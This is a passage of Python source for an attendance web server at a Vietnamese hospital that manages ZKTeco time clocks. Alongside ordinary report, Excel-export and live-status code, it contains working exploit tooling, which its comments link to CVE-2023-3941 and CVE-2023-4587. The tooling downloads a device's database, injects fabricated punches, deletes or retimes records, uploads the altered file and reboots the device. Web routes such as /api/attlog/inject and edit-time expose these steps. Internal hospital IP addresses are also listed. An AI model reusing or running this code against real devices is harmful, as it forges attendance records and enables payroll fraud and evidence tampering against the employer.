        log.append('✅ Downloaded ZKDB.db: {} bytes từ {}'.format(len(sq), used_web))
    except Exception as e:
        log.append('❌ Web + Protocol download fail: {}'.format(e))
        return {'ok': False, 'error': 'Web download failed: ' + str(e),
                'log': log,
                'hint': ('Không tải được ZKDB.db từ bất kỳ nguồn nào.\n\n'
                         '🔌 Kiểm tra: VPN Bệnh viện (172.16.x.x) đã bật chưa?\n'
                         '🌐 Web UI May 14 fw ở 172.16.254.202 (cần quyền truy cập).\n'
                         '🔧 Nếu chỉ tới được máy chấm công: protocol READFILE cũng cần port 4370 mở.')}

    # 2. Insert records
    db = sqlite3.connect(db_path)
    cur = db.cursor()
    before = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
    for i in range(count):
        # Use marker + timestamp + counter to ensure uniqueness
        m = marker if not marker else (marker if count == 1 else '{}#{}'.format(marker, i+1))
        cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status,
                       Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
                       VALUES (?, ?, ?, ?, 0, 0, 0, ?, NULL, 0)''',
                    (str(pin), int(verify_mode), timestamp, int(status), m))
    db.commit()
    after = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
    new_ids = cur.execute('SELECT ID, User_PIN, Verify_Time, CREATE_ID FROM ATT_LOG '
                          'WHERE ID > ?', (before,)).fetchall()
    db.close()
    log.append('SQLite injected: {} -> {} (+{})'.format(before, after, after-before))
    if progress_cb: progress_cb('Uploading ZKDB.db to device...')

    # 3. Connect and upload
    try:
        zk = ZK(ip, port=4370, timeout=60, ommit_ping=True, verbose=False)
        conn = zk.connect()
        if not conn:
            return {'ok': False, 'error': 'device connect failed', 'log': log, 'new_ids': new_ids}
        try: conn.disable_device()
        except: pass
        with open(db_path, 'rb') as f:
            data = f.read()
        result = _attlog_upload_zkdb(conn, data)
        log.append('Upload result: {}'.format(result))

        # 4. Reboot
        try: conn.restart()
        except Exception as e: log.append('Restart: ' + str(e))
        try: conn.disconnect()
        except: pass

        return {'ok': True, 'before': before, 'after': after, 'new_ids': new_ids,
                'upload_time_s': result.get('time_s', 0), 'log': log,
                'message': 'Da inject {} record. Doi ~30s cho reboot xong.'.format(count)}
    except Exception as e:
        return {'ok': False, 'error': 'inject failed: ' + str(e)[:300], 'log': log,
                'new_ids': new_ids}


def attlog_delete_marker(ip, marker, web_ip=None, progress_cb=None):
    """Delete ATTLOG records where CREATE_ID=marker via CVE-2023-3941."""
    import sqlite3
    log = []
    if progress_cb: progress_cb('Downloading ZKDB.db (web → protocol fallback)...')
    db_path = os.path.join(ATTLOG_WORK_DIR, 'delete_{}.db'.format(int(time.time())))
    try:
        web_candidates = _attlog_web_candidates(web_ip, ip)
        sq, used_web = _attlog_download_zkdb_with_fallback(web_candidates, db_path, progress_cb=progress_cb, device_ip=ip)
        log.append('Downloaded: {} bytes từ {}'.format(len(sq), used_web))
    except Exception as e:
        log.append('Web+Protocol download fail: {}'.format(e))
        return {'ok': False, 'error': 'web+protocol download: ' + str(e),
                'log': log, 'hint': 'Để trống IP Web để tự động fallback; protocol cần port 4370 mở'}

    db = sqlite3.connect(db_path)
    cur = db.cursor()
    before = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
    matched = cur.execute('SELECT COUNT(*) FROM ATT_LOG WHERE CREATE_ID=?', (marker,)).fetchone()[0]
    if matched == 0:
        db.close()
        return {'ok': True, 'deleted': 0, 'before': before, 'after': before,
                'log': log + ['No records with marker "{}"'.format(marker)]}
    cur.execute('DELETE FROM ATT_LOG WHERE CREATE_ID = ?', (marker,))
    db.commit()
    after = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
    db.close()
    log.append('Deleted {} records'.format(matched))
    if progress_cb: progress_cb('Uploading to device...')

    # Upload
    try:
        zk = ZK(ip, port=4370, timeout=60, ommit_ping=True, verbose=False)
        conn = zk.connect()
        if not conn:
            return {'ok': False, 'error': 'device connect failed', 'log': log}
        try: conn.disable_device()
        except: pass
        with open(db_path, 'rb') as f:
            data = f.read()
        result = _attlog_upload_zkdb(conn, data)
        log.append('Upload: {}'.format(result))
        try: conn.restart()
        except: pass
        try: conn.disconnect()
        except: pass
        return {'ok': True, 'deleted': matched, 'before': before, 'after': after,
                'upload_time_s': result.get('time_s', 0), 'log': log}
    except Exception as e:
        return {'ok': False, 'error': 'upload failed: ' + str(e), 'log': log}


def attlog_edit_time(ip, marker, new_time, web_ip=None, progress_cb=None):
    """Edit ATTLOG Verify_Time for records matching marker."""
    import sqlite3
    log = []
    if progress_cb: progress_cb('Downloading ZKDB.db (web → protocol fallback)...')
    db_path = os.path.join(ATTLOG_WORK_DIR, 'edit_{}.db'.format(int(time.time())))
    try:
        web_candidates = _attlog_web_candidates(web_ip, ip)
        sq, used_web = _attlog_download_zkdb_with_fallback(web_candidates, db_path, progress_cb=progress_cb, device_ip=ip)
        log.append('Downloaded: {} bytes từ {}'.format(len(sq), used_web))
    except Exception as e:
        log.append('Web+Protocol download fail: {}'.format(e))
        return {'ok': False, 'error': 'web+protocol download: ' + str(e),
                'log': log, 'hint': 'Để trống IP Web để tự động fallback'}

    db = sqlite3.connect(db_path)
    cur = db.cursor()
    before = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
    matched = cur.execute('SELECT ID, Verify_Time FROM ATT_LOG WHERE CREATE_ID=?', (marker,)).fetchall()
    if not matched:
        db.close()
        return {'ok': False, 'error': 'No records with marker "{}"'.format(marker), 'log': log}
    cur.execute('UPDATE ATT_LOG SET Verify_Time=? WHERE CREATE_ID=?', (new_time, marker))
    db.commit()
    log.append('Updated {} records to {}'.format(len(matched), new_time))
    db.close()
    if progress_cb: progress_cb('Uploading to device...')

    # Upload
    try:
        zk = ZK(ip, port=4370, timeout=60, ommit_ping=True, verbose=False)
        conn = zk.connect()
        if not conn:
            return {'ok': False, 'error': 'device connect failed', 'log': log}
        try: conn.disable_device()
        except: pass
        with open(db_path, 'rb') as f:
            data = f.read()
        result = _attlog_upload_zkdb(conn, data)
        log.append('Upload: {}'.format(result))
        try: conn.restart()
        except: pass
        try: conn.disconnect()
        except: pass
        return {'ok': True, 'edited': len(matched), 'affected_ids': [r[0] for r in matched],
                'old_times': [r[1] for r in matched], 'new_time': new_time,
                'upload_time_s': result.get('time_s', 0), 'log': log}
    except Exception as e:
        return {'ok': False, 'error': 'upload failed: ' + str(e), 'log': log}


def attlog_recent(ip, limit=50, web_ip=None):
    """Get recent N ATTLOG records. Tries web backup (auto-fallback across known web IPs), then device.

    Special: when VPN mode (going through Sophos), Web UI 172.16.254.202 is the ONLY
    reliable source (other IPs blocked by Sophos gateway). We always include it in the chain.
    """
    import sqlite3
    # Known web IPs (auto-fallback chain) - May 14 2018 fw at 172.16.254.202 has web
    web_candidates = _attlog_web_candidates(web_ip, ip)
    last_err = None
    for try_web in web_candidates:
        try:
            db_path = os.path.join(ATTLOG_WORK_DIR, 'recent_{}.db'.format(int(time.time())))
            sq = _attlog_download_zkdb(try_web, db_path)
            db = sqlite3.connect(db_path)
            cur = db.cursor()
            total = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
            # Get all useful columns from ATT_LOG
            rows = cur.execute(
                'SELECT ID, User_PIN, Verify_Type, Verify_Time, Status, '
                'Sensor_NO, CREATE_ID, Work_Code_ID, Att_Flag, SEND_FLAG '
                'FROM ATT_LOG ORDER BY ID DESC LIMIT ?', (limit,)
            ).fetchall()
            # Lookup user names from USER_INFO (PIN → Name)
            user_names = {}
            try:
                user_rows = cur.execute('SELECT Badgenumber, Name FROM USER_INFO').fetchall()
                for ur in user_rows:
                    user_names[str(ur[0])] = ur[1] or ''
            except Exception:
                pass
            db.close()
            try: os.remove(db_path)
            except: pass
            # Lookup device name from devices_state
            dev_name = ''
            try:
                for d in devices_state:
                    if d.get('ip') == ip:
                        dev_name = d.get('note') or d.get('ip')
                        break
            except: pass
            records = []
            for r in rows:
                pin_str = str(r[1]) if r[1] is not None else ''
                records.append({
                    'id': r[0] or 0,
                    'user_id': pin_str,
                    'user_name': user_names.get(pin_str, ''),
                    'verify_type': r[2] if r[2] is not None else 0,
                    'timestamp': r[3] or '',
                    'status': r[4] if r[4] is not None else 0,
                    'sensor': r[5] if r[5] is not None else 0,
                    'marker': r[6] or '',
                    'work_code': r[7] if r[7] is not None else 0,
                    'att_flag': r[8] if r[8] is not None else 0,
                    'send_flag': r[9] if r[9] is not None else 0,
                    'device_ip': ip,
                    'device_name': dev_name or ip,
                    'source': 'web'
                })
            return {'ok': True, 'count': total, 'records': records, 'source': 'web_backup({})'.format(try_web), 'web_ip_used': try_web}
        except Exception as e:
            last_err = e
            print('[attlog_recent] web {} failed: {}'.format(try_web, e), flush=True)
            continue

    # Fall back to device read via pyzk (works for May 3 / reachable IPs)
    try:
        zk = ZK(ip, port=4370, timeout=15, ommit_ping=True, verbose=False)
        conn = zk.connect()
        if not conn:
            return {'ok': False, 'error': 'connect failed: {}'.format(last_err),
                    'hint': 'Qua VPN, chi ping duoc May 3 (172.16.0.214) va Web UI (172.16.254.202). May khac bi Sophos chan.'}
        try:
            records = conn.get_attendance()
            count = len(records) if records else 0
            recent = []
            if records:
                sliced = records[-limit:] if len(records) > limit else records
                for r in sliced:
                    try:
                        ts = r.timestamp.strftime('%Y-%m-%d %H:%M:%S') if hasattr(r.timestamp, 'strftime') else str(r.timestamp)
                    except:
                        ts = str(getattr(r, 'timestamp', ''))
                    recent.append({
                        'id': getattr(r, 'uid', 0) or 0,
                        'user_id': getattr(r, 'user_id', '') or '',
                        'verify_type': getattr(r, 'punch', 0) or 0,
                        'timestamp': ts,
                        'status': getattr(r, 'status', 0) or 0,
                        'sensor': 0,
                        'marker': '',
                        'device_ip': ip,
                        'device_name': ip,
                        'source': 'device'
                    })
                recent.reverse()
            return {'ok': True, 'count': count, 'records': recent, 'source': 'device', 'web_err': str(last_err)[:100] if last_err else None}
        finally:
            try: conn.disconnect()
            except: pass
    except Exception as e2:
        return {'ok': False, 'error': 'web+device both fail: web={} device={}'.format(last_err, e2)[:300]}


class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        path = urlparse(self.path).path
        if path == '/health':
            # v2.6.4: Health check endpoint (Flutter isReady() goi day)
            self.send_response(200)
            self.send_header('Content-Type', 'application/json; charset=utf-8')
            self.end_headers()
            self.wfile.write(b'{"ok": true, "service": "attendance_web", "version": "2.6.4"}')
        elif path == '/' or path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode('utf-8'))
        elif path == '/launcher.html':
            # Serve the launcher page that contains tabs to both apps
            launcher_path = os.path.join(os.path.dirname(__file__), 'launcher.html')
            if os.path.exists(launcher_path):
                with open(launcher_path, 'rb') as f:
                    content = f.read()
                self.send_response(200)
                self.send_header('Content-Type', 'text/html; charset=utf-8')
                self.end_headers()
                self.wfile.write(content)
            else:
                self.send_response(404)
                self.end_headers()
        elif path == '/tools.html':
            self._handle_tools_page()
        elif path == '/api/devices':
            self.send_json(devices_state)
        elif path == '/api/status':
            self.send_json(fetch_status)
        elif path == '/api/records':
            self.send_json(all_records)
        elif path == '/api/report/daily':
            self._handle_daily_report()
        elif path == '/api/report/today':
            self._handle_today_report()
        elif path == '/api/report/export':
            self._handle_excel_export()
        elif path == '/api/live':
            self._handle_live_status()
        elif path == '/api/live/page':
            self._handle_live_page()
        elif path == '/api/diag':
            self._handle_diag()
        elif path.startswith('/api/attlog/job/'):
            job_id = path[len('/api/attlog/job/'):]
            if job_id in ATTLOG_JOBS:
                self.send_json(ATTLOG_JOBS[job_id])
            else:
                self.send_json({'ok': False, 'error': 'Unknown job: ' + job_id}, status=404)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path
        length = int(self.headers.get('Content-Length', 0))
        # Robust decode - some clients send latin-1 with Vietnamese chars
        raw = self.rfile.read(length) if length else b''
        # Try utf-8 first, fallback to latin-1 (which never fails)
        body = None
        for enc in ('utf-8', 'utf-8-sig', 'latin-1'):
            try:
                body = raw.decode(enc)
                break
            except:
                continue
        if body is None:
            body = raw.decode('utf-8', errors='replace')
        try:
            data = json.loads(body) if body else {}
        except:
            data = {}

        if path == '/api/fetch':
            ips = data.get('ips', [])
            date_from = None
            date_to = None
            try:
                if data.get('dateFrom'):
                    date_from = datetime.strptime(data['dateFrom'], '%Y-%m-%d')
                if data.get('dateTo'):
                    date_to = datetime.strptime(data['dateTo'], '%Y-%m-%d') + timedelta(days=1) - timedelta(seconds=1)
            except: pass
            if not ips:
                self.send_json({'ok': False, 'error': 'Khong co may nao duoc chon'}, status=400)
                return
            if fetch_status['running']:
                self.send_json({'ok': False, 'error': 'Server dang fetch, vui long doi hoac bam Dung'}, status=429)
                return
            t = threading.Thread(target=fetch_worker, args=(ips, date_from, date_to), daemon=True)
            t.start()
            self.send_json({'ok': True, 'message': 'Bat dau fetch ' + str(len(ips)) + ' may'})
        elif path == '/api/cancel':
            if fetch_status['running']:
                fetch_status['cancel_requested'] = True
                self.send_json({'ok': True, 'message': 'Da yeu cau dung'})
            else:
                self.send_json({'ok': False, 'error': 'Khong co fetch dang chay'}, status=400)
        elif path == '/api/remote-punch':
            # Ghi vao pending_punches.csv de remote_punch_service.py sync
            user_id = str(data.get('user_id', '')).strip()
            status_code = int(data.get('status', 0))
            punch_code = int(data.get('punch', 0))
            device_ip = str(data.get('device_ip', '172.16.0.212')).strip() or '172.16.0.212'
            if not user_id:
                self.send_json({'ok': False, 'error': 'Thieu user_id'}, status=400)
                return
            try:
                # Dung cung path voi remote_punch_service.py de service sync thay
                pending_path = os.path.join(os.path.dirname(SCRIPT_DIR), 'pending_punches.csv')
                file_exists = os.path.exists(pending_path)
                statuses = {0: 'Check-In', 1: 'Check-Out', 2: 'Break-Out',
                            3: 'Break-In', 4: 'OT-In', 5: 'OT-Out'}
                punch_id = int(time.time() * 1000) if 'time' in dir(__builtins__) else 0
                import time as _t
                punch_id = int(_t.time() * 1000)
                row = {
                    'punch_id': str(punch_id),
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'user_id': user_id,
                    'user_name': 'NV ' + user_id,
                    'status': str(status_code),
                    'status_name': statuses.get(status_code, 'Unknown'),
                    'punch': str(punch_code),
                    'method_name': 'Remote',
                    'device_ip': device_ip,
                    'synced_via': '',
                    'synced_at': '',
                    'note': 'from attendance_web.py /api/remote-punch',
                }
                with open(pending_path, 'a', encoding='utf-8-sig', newline='') as f:
                    fieldnames = ['punch_id', 'timestamp', 'user_id', 'user_name',
                                  'status', 'status_name', 'punch', 'method_name',
                                  'device_ip', 'synced_via', 'synced_at', 'note']
                    writer = csv.DictWriter(f, fieldnames=fieldnames)
                    if not file_exists:
                        writer.writeheader()
                    writer.writerow(row)
                self.send_json({'ok': True, 'message': 'Da ghi vao pending queue',
                                'punch_id': punch_id})
                print('[remote-punch] Queued #{0} NV {1}'.format(punch_id, user_id), flush=True)
            except Exception as e:
                self.send_json({'ok': False, 'error': str(e)[:100]}, status=500)
        elif path == '/api/devices/save':
            # Save devices_state from frontend
            devs = data.get('devices', [])
            for d_new in devs:
                d_old = next((x for x in devices_state if x['ip'] == d_new.get('ip')), None)
                if d_old:
                    d_old['type'] = d_new.get('type', d_old['type'])
                    d_old['note'] = d_new.get('note', d_old['note'])
                    d_old['selected'] = d_new.get('selected', d_old['selected'])
            save_devices()
            self.send_json({'ok': True, 'message': 'Da luu'})
        # ============================================================
        # ATTLOG TOOL ROUTES (CVE-2023-3941 + CVE-2023-4587)
        # ============================================================
        elif path == '/api/attlog/device-info':
            ip = data.get('ip', '').strip()
            if not ip:
                self.send_json({'ok': False, 'error': 'Thieu IP'}, status=400)
                return
            info = get_device_info(ip)
            self.send_json({'ok': info.get('connected', False), **info})
        elif path == '/api/attlog/check-user':
            ip = data.get('ip', '').strip()
            pin = data.get('pin', '').strip()
            password = data.get('password', None)
            if not ip or not pin:
                self.send_json({'ok': False, 'error': 'Thieu ip hoac pin'}, status=400)
                return
            result = check_user(ip, pin, password=password)
            self.send_json(result)
        elif path == '/api/attlog/inject':
            ip = data.get('ip', '').strip()
            if not ip:
                self.send_json({'ok': False, 'error': 'Thieu ip'}, status=400)
                return
            job_id, err = _start_attlog_job('inject', data)
            if err:
                self.send_json({'ok': False, 'error': err}, status=400)
            else:
                self.send_json({'ok': True, 'job_id': job_id, 'message': 'Job started. Poll /api/attlog/job/' + job_id})
        elif path == '/api/attlog/delete-marker':
            ip = data.get('ip', '').strip()
            if not ip:
                self.send_json({'ok': False, 'error': 'Thieu ip'}, status=400)
                return
            job_id, err = _start_attlog_job('delete', data)
            if err:
                self.send_json({'ok': False, 'error': err}, status=400)
            else:
                self.send_json({'ok': True, 'job_id': job_id, 'message': 'Job started. Poll /api/attlog/job/' + job_id})
        elif path == '/api/attlog/edit-time':
            ip = data.get('ip', '').strip()
            if not ip:
                self.send_json({'ok': False, 'error': 'Thieu ip'}, status=400)
                return
            job_id, err = _start_attlog_job('edit', data)
            if err:
                self.send_json({'ok': False, 'error': err}, status=400)
            else:
                self.send_json({'ok': True, 'job_id': job_id, 'message': 'Job started. Poll /api/attlog/job/' + job_id})
        elif path == '/api/attlog/real-punch':
            ip = data.get('ip', '').strip()
            pin = str(data.get('pin', '')).strip()
            status = int(data.get('status', 0))
            if not ip or not pin:
                self.send_json({'ok': False, 'error': 'Thieu ip/pin'}, status=400)
                return
            ts = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
            data['timestamp'] = ts
            data['marker'] = 'APK_REAL_PUNCH'
            data['count'] = 1
            job_id, err = _start_attlog_job('inject', data)
            if err:
                self.send_json({'ok': False, 'error': err}, status=400)
            else:
                self.send_json({'ok': True, 'job_id': job_id, 'message': 'Real punch job started. Poll /api/attlog/job/' + job_id})
        elif path.startswith('/api/attlog/job/'):
            job_id = path[len('/api/attlog/job/'):]
            if job_id in ATTLOG_JOBS:
                self.send_json(ATTLOG_JOBS[job_id])
            else:
                self.send_json({'ok': False, 'error': 'Unknown job'}, status=404)
        elif path == '/api/attlog/ping-all':
            # Ping all attendance devices in parallel (fast)
            self._handle_ping_all()
        elif path == '/api/attlog/recent':
            ip = data.get('ip', '').strip()
            limit = int(data.get('limit', 50))
            if not ip:
                self.send_json({'ok': False, 'error': 'Thieu IP'}, status=400)
                return
            result = attlog_recent(ip, limit=limit)
            self.send_json(result)
        elif path == '/api/attlog/real-punch':
            # Inject 1 ATTLOG record (simulator-style) but write to REAL device
            ip = data.get('ip', '').strip()
            pin = str(data.get('pin', '')).strip()
            status = int(data.get('status', 0))
            if not ip or not pin:
                self.send_json({'ok': False, 'error': 'Thieu ip/pin'}, status=400)
                return
            ts = datetime.now().strftime('%Y-%m-%dT%H:%M:%S')
            result = attlog_inject(ip, pin, ts, status=status, punch=1,
                                    verify_mode=1, marker='APK_REAL_PUNCH',
                                    web_ip=data.get('web_ip', '').strip() or None,
                                    count=1)
            self.send_json(result)
        else:
            self.send_response(404)
            self.end_headers()

    def send_json(self, obj, status=200):
        body = json.dumps(obj, ensure_ascii=False, default=str)
        self.send_response(status)
        self.send_header('Content-Type', 'application/json; charset=utf-8')
        self.send_header('Content-Length', str(len(body.encode('utf-8'))))
        self.end_headers()
        self.wfile.write(body.encode('utf-8'))

    def _calculate_shift_pairs(self, records_for_nv):
        """Pair In/Out events for a single NV on a single day.
        Returns list of (in_time, out_time, hours_worked) tuples.
        Logic: Pair consecutive In/Out, skip unmatched at end.
        """
        pairs = []
        last_in = None
        # Sort by time
        sorted_recs = sorted(records_for_nv, key=lambda r: r.get('time', ''))
        for r in sorted_recs:
            st = r.get('status', 0)
            tm = r.get('time', '')
            if st == 0:  # Check-In
                last_in = tm
            elif st == 1:  # Check-Out
                if last_in:
                    try:
                        # Parse HH:MM:SS
                        from datetime import datetime
                        in_dt = datetime.strptime(last_in, '%H:%M:%S')
                        out_dt = datetime.strptime(tm, '%H:%M:%S')
                        delta = (out_dt - in_dt).total_seconds() / 3600.0
                        if delta < 0:
                            delta += 24  # overnight
                        pairs.append((last_in, tm, round(delta, 2)))
                    except:
                        pairs.append((last_in, tm, 0))
                    last_in = None
                else:
                    # Orphan Check-Out, skip
                    pass
        # If last_in is set at end, incomplete shift
        if last_in:
            pairs.append((last_in, None, None))  # Incomplete
        return pairs

    def _handle_daily_report(self):
        """Build daily report: for each NV on each day, calculate total hours worked."""
        from collections import defaultdict
        report = defaultdict(lambda: defaultdict(list))  # date -> nv -> [records]
        for r in all_records:
            d = r.get('date', '')
            nv = str(r.get('user_id', ''))
            if d and nv:
                report[d][nv].append(r)
        # Build summary
        summary = []
        for date in sorted(report.keys(), reverse=True):
            day_data = {
                'date': date,
                'nvs': []
            }
            for nv in sorted(report[date].keys()):
                recs = report[date][nv]
                pairs = self._calculate_shift_pairs(recs)
                total_hours = sum(p[2] for p in pairs if p[2] is not None)
                check_ins = sum(1 for r in recs if r.get('status') == 0)
                check_outs = sum(1 for r in recs if r.get('status') == 1)
                first_in = min((r.get('time', '') for r in recs if r.get('status') == 0), default='')
                last_out = max((r.get('time', '') for r in recs if r.get('status') == 1), default='')
                # Determine devices
                devices = list(set(r.get('device_ip', '') for r in recs))
                day_data['nvs'].append({
                    'user_id': nv,
                    'punches': len(recs),
                    'check_ins': check_ins,
                    'check_outs': check_outs,
                    'first_in': first_in,
                    'last_out': last_out,
                    'hours_worked': round(total_hours, 2),
                    'shifts': len(pairs),
                    'complete_shifts': sum(1 for p in pairs if p[2] is not None),
                    'devices': devices,
                    'status': 'Complete' if not any(p[2] is None for p in pairs) and len(pairs) > 0 else 'Incomplete',
                })
            summary.append(day_data)
        self.send_json({'days': summary, 'total_nvs': sum(len(d['nvs']) for d in summary)})

    def _handle_today_report(self):
        """Build today's attendance report with NVs in/out/missing status."""
        from collections import defaultdict
        today = datetime.now().strftime('%Y-%m-%d')
        today_recs = [r for r in all_records if r.get('date') == today]
        # Group by NV
        by_nv = defaultdict(list)
        for r in today_recs:
            nv = str(r.get('user_id', ''))
            by_nv[nv].append(r)
        # Build status
        result = []
        in_count = 0
        out_count = 0
        working_count = 0
        for nv, recs in by_nv.items():
            pairs = self._calculate_shift_pairs(recs)
            # Current status: if last action is Check-In, NV is "In"; if Check-Out, "Out"
            last_rec = max(recs, key=lambda r: r.get('time', ''))
            last_status = last_rec.get('status', 0)
            if last_status == 0:
                current = 'In'
                in_count += 1
                working_count += 1
            elif last_status == 1:
                current = 'Out'
                out_count += 1
            else:
                current = 'Break'
            # Total hours so far
            total_hours = sum(p[2] for p in pairs if p[2] is not None)
            result.append({
                'user_id': nv,
                'current_status': current,
                'punches': len(recs),
                'first_in': min((r.get('time', '') for r in recs if r.get('status') == 0), default=''),
                'last_event': last_rec.get('time', ''),
                'last_action': last_rec.get('status_name', ''),
                'hours_worked': round(total_hours, 2),
                'devices': list(set(r.get('device_ip', '') for r in recs)),
            })
        result.sort(key=lambda x: x['user_id'])
        self.send_json({
            'date': today,
            'total_punches': len(today_recs),
            'unique_nvs': len(by_nv),
            'in_count': in_count,
            'out_count': out_count,
            'working_count': working_count,
            'nvs': result,
        })

    def _handle_excel_export(self):
        """Export attendance as Excel-compatible HTML (.xls) with shift detection."""
        from collections import defaultdict
        from datetime import datetime
        # Group by date and NV
        by_date_nv = defaultdict(lambda: defaultdict(list))
        for r in all_records:
            d = r.get('date', '')
            nv = str(r.get('user_id', ''))
            if d and nv:
                by_date_nv[d][nv].append(r)
        # Build Excel HTML
        rows = []
        rows.append('<tr><th>Ngày</th><th>Mã NV</th><th>Check-In</th><th>Check-Out</th><th>Số giờ</th><th>Ca</th><th>Trạng thái</th><th>Thiết bị</th></tr>')
        for date in sorted(by_date_nv.keys(), reverse=True):
            for nv in sorted(by_date_nv[date].keys()):
                recs = by_date_nv[date][nv]
                pairs = self._calculate_shift_pairs(recs)
                first_in = min((r.get('time', '') for r in recs if r.get('status') == 0), default='')
                last_out = max((r.get('time', '') for r in recs if r.get('status') == 1), default='')
                total_hours = sum(p[2] for p in pairs if p[2] is not None)
                complete = sum(1 for p in pairs if p[2] is not None)
                status = 'Hoàn thành' if complete == len(pairs) and len(pairs) > 0 else 'Chưa đủ'
                devices = ', '.join(sorted(set(r.get('device_ip', '') for r in recs)))
                rows.append('<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td><td>%.2f</td><td>%d</td><td>%s</td><td>%s</td></tr>' % (
                    date, nv, first_in, last_out, total_hours, complete, status, devices
                ))
        html = (
            '<html xmlns:o="urn:schemas-microsoft-com:office:office" '
            'xmlns:x="urn:schemas-microsoft-com:office:excel" '
            'xmlns="http://www.w3.org/TR/REC-html40">'
            '<head><meta charset="utf-8"><style>table { border-collapse: collapse; } '
            'th, td { border: 1px solid #999; padding: 4px 8px; } th { background: #ddd; }</style></head>'
            '<body><h2>Báo cáo chấm công - BVĐK Ninh Thuận</h2>'
            '<p>Xuất lúc: %s</p><table>%s</table></body></html>' % (
                datetime.now().strftime('%Y-%m-%d %H:%M:%S'), ''.join(rows)
            )
        )
        body = html.encode('utf-8')
        filename = 'attendance_%s.xls' % datetime.now().strftime('%Y%m%d_%H%M%S')
        self.send_response(200)
        self.send_header('Content-Type', 'application/vnd.ms-excel; charset=utf-8')
        self.send_header('Content-Disposition', 'attachment; filename="%s"' % filename)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _handle_live_status(self):
        """
        Live device status: probe all 27 devices' TCP 4370 in parallel.
        Returns JSON with ping_ok, ping_ms, ping_at per device.
        Probe runs in a background thread so the HTTP call is fast.
        """
        snapshot = [dict(d) for d in devices_state]
        for d in snapshot:
            d.setdefault('ping_ok', None)
            d.setdefault('ping_ms', 0)
            d.setdefault('ping_err', '')
            d.setdefault('ping_at', '')
        t = threading.Thread(target=live_status_worker, args=(snapshot,), daemon=True)
        t.start()
        # Give the worker a moment to probe everything (16 workers, ~1.5s timeout each)
        t.join(timeout=4.0)
        ok_count = sum(1 for d in snapshot if d.get('ping_ok'))
        result = {
            'ok': True,
            'checked': len(snapshot),
            'online': ok_count,
            'offline': len(snapshot) - ok_count,
            'devices': snapshot,
            'probed_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }
        # Persist the latest probe into devices_state so the JSON `/api/devices` reflects it
        try:
            latest = {d['ip']: d for d in snapshot}
            for d in devices_state:
                if d['ip'] in latest:
                    ld = latest[d['ip']]
                    d['ping_ok'] = ld.get('ping_ok')
                    d['ping_ms'] = ld.get('ping_ms', 0)
                    d['ping_at'] = ld.get('ping_at', '')
                    d['ping_err'] = ld.get('ping_err', '')
        except Exception:
            pass
        self.send_json(result)

    def _handle_live_page(self):
        """Render a standalone Live Status page (refreshes every 8s)."""
        page = '''<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="utf-8">
<title>Live Device Status - BVĐK Ninh Thuận</title>
<style>
  body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #e2e8f0; margin: 0; padding: 16px; }
  h1 { margin: 0 0 6px; font-size: 22px; }
  .sub { color: #94a3b8; margin-bottom: 14px; font-size: 13px; }
  .stats { display: flex; gap: 12px; margin-bottom: 14px; flex-wrap: wrap; }
  .stat { background: #1e293b; padding: 10px 16px; border-radius: 8px; min-width: 110px; border-left: 4px solid #475569; }
  .stat .v { font-size: 24px; font-weight: 700; }
  .stat .l { font-size: 12px; color: #94a3b8; }
  .stat.ok { border-left-color: #10b981; }
  .stat.ok .v { color: #10b981; }
  .stat.fail { border-left-color: #ef4444; }
  .stat.fail .v { color: #ef4444; }
  table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 8px; overflow: hidden; }
  th, td { padding: 8px 12px; text-align: left; font-size: 13px; border-bottom: 1px solid #334155; }
  th { background: #334155; color: #f1f5f9; font-weight: 600; }
  tr:hover { background: #334155; }
  .pill { display: inline-block; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; }
  .pill-on { background: #064e3b; color: #6ee7b7; }
  .pill-off { background: #7f1d1d; color: #fca5a5; }
  .pill-att { background: #1e3a8a; color: #93c5fd; }
  .pill-sig { background: #581c87; color: #d8b4fe; }
  .pill-virt { background: #374151; color: #d1d5db; }
  .err { color: #f87171; font-size: 11px; font-family: monospace; }
  button { background: #2563eb; color: white; border: 0; padding: 8px 14px; border-radius: 6px; cursor: pointer; font-size: 13px; margin-right: 8px; }
  button:hover { background: #1d4ed8; }
  .refresh-info { color: #94a3b8; font-size: 12px; margin-left: 12px; }
  .search-box { display: inline-block; margin-left: 12px; }
  .search-box input { background: #1e293b; color: #e2e8f0; border: 1px solid #475569;
                      padding: 8px 12px; border-radius: 6px; font-size: 13px; width: 240px; }
  .search-box input:focus { outline: none; border-color: #3b82f6; }
  .filter-chip { display: inline-block; padding: 4px 10px; margin-left: 6px; border-radius: 14px;
                 font-size: 11px; font-weight: 600; cursor: pointer; user-select: none;
                 background: #334155; color: #94a3b8; border: 1px solid #475569; }
  .filter-chip.active { background: #1e3a8a; color: #93c5fd; border-color: #3b82f6; }
  .filter-chip:hover { background: #475569; }
</style>
</head>
<body>
<h1>📡 Live Device Status</h1>
<div class="sub">BVĐK Ninh Thuận - Khoa Cấp Cứu Lưu Ký - Auto-probe mỗi 8 giây</div>
<div>
  <button onclick="probe()">🔄 Probe ngay</button>
  <button onclick="window.close()">✕ Đóng</button>
  <span class="refresh-info" id="info">Đang tải...</span>
  <span class="search-box">
    <input type="text" id="searchBox" placeholder="🔍 Tìm theo IP / tên / lỗi..."
